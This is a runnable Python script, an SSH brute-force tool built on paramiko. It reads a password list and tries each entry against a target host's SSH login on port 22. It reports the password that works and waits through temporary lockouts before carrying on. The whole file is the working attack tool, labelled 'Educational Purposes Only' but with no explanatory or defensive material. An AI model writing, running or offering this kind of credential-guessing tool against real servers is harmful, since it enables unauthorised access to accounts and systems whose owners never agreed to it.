import argparse
import paramiko
from time import sleep
from colorama import Fore, Style, init

# Initialize colorama
init()

def ssh_brute_force(host, port, username, password_list):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for password in password_list:
        try:
            print(f"{Fore.BLUE}Trying password: {password}{Style.RESET_ALL}")
            client.connect(host, port=port, username=username, password=password, timeout=5)
            print(f"{Fore.GREEN}KEY FOUND: {password}{Style.RESET_ALL}")
            client.close()
            return password
        except paramiko.AuthenticationException:
            print(f"{Fore.RED}BAD PASS: {password}{Style.RESET_ALL}")
        except paramiko.SSHException as e:
            print(f"{Fore.YELLOW}SSH Error: {e}{Style.RESET_ALL}")
            sleep(5)  # Retry after a delay in case of temporary lockout
        except Exception as e:
            print(f"{Fore.YELLOW}Unexpected error: {e}{Style.RESET_ALL}")

    print(f"{Fore.RED}KEY NOT FOUND{Style.RESET_ALL}")
    return None


def main():
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool (Educational Purposes Only)")
    parser.add_argument("-l", "--username", required=True, help="Target SSH username")
    parser.add_argument("-P", "--password-list", required=True, help="Path to the password list file")
    parser.add_argument("target", help="Target SSH server in the format ssh:<IP>")

    args = parser.parse_args()

    # Parse target
    if not args.target.startswith("ssh:"):
        print("Error: Target must start with 'ssh:'")
        return
    host = args.target.split(":")[1]

    # Set SSH default port
    port = 22

    # Read password list
    try:
        with open(args.password_list, 'r') as f:
            password_list = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print(f"Error: The file {args.password_list} was not found.")
        return

    # Call SSH brute force function
    ssh_brute_force(host, port, args.username, password_list)


if __name__ == "__main__":
    main()
